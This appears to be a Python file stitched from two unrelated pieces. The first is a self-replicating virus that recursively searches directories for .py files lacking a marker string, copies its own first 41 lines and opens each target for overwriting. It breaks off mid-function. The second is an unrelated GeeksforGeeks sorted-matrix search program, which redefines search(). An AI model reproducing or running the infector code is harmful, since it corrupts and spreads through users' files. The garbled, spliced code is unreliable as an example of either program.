#!/usr/bin/python 
import os, datetime, inspect 
DATA_TO_INSERT = "GEEKSFORGEEKS"
  
#search for target files in path
def search(path):  
    filestoinfect = [] 
    filelist = os.listdir(path) 
    for filename in filelist: 
          
        #If it is a folder
        if os.path.isdir(path+"/"+filename):  
            filestoinfect.extend(search(path+"/"+filename)) 
              
        #If it is a python script -> Infect it    
        elif filename[-3:] == ".py":
              
            #default value
            infected = False  
            for line in open(path+"/"+filename): 
                if DATA_TO_INSERT in line: 
                    infected = True
                    break
            if infected == False: 
                filestoinfect.append(path+"/"+filename) 
    return filestoinfect 
  
#changes to be made in the target file 
def infect(filestoinfect): 
    target_file = inspect.currentframe().f_code.co_filename 
    virus = open(os.path.abspath(target_file)) 
    virusstring = "" 
    for i,line in enumerate(virus): 
        if i>=0 and i <41: 
            virusstring += line 
    virus.close 
    for fname in filestoinfect: 
        f = open(fname) 
        temp = f.read() 
        f.close() 
        f = open(fname,"w") 
# Python3 program to search an element
# in row-wise and column-wise sorted matrix

# Searches the element x in mat[][]. If the
# element is found, then prints its position
# and returns true, otherwise prints "not found"
# and returns false
def search(mat, n, x):

    i = 0

    # set indexes for top right element
    j = n - 1
    while (i < n and j >= 0):

        if (mat[i][j] == x):

            print("Element found at ", i, ", ", j)
            return 1

        if (mat[i][j] > x):
            j -= 1

        # if mat[i][j] < x
        else:
            i += 1

    print("Element not found")
    return 0  # if (i == n || j == -1 )


# Driver Code
mat = [[10, 20, 30, 40],
       [15, 25, 35, 45],
       [27, 29, 37, 48],
       [32, 33, 39, 50]]
search(mat, 4, 29)

# This code is contributed by Anant Agarwal.
# Time Complexity: O(n)
# Space Complexity: O(1)
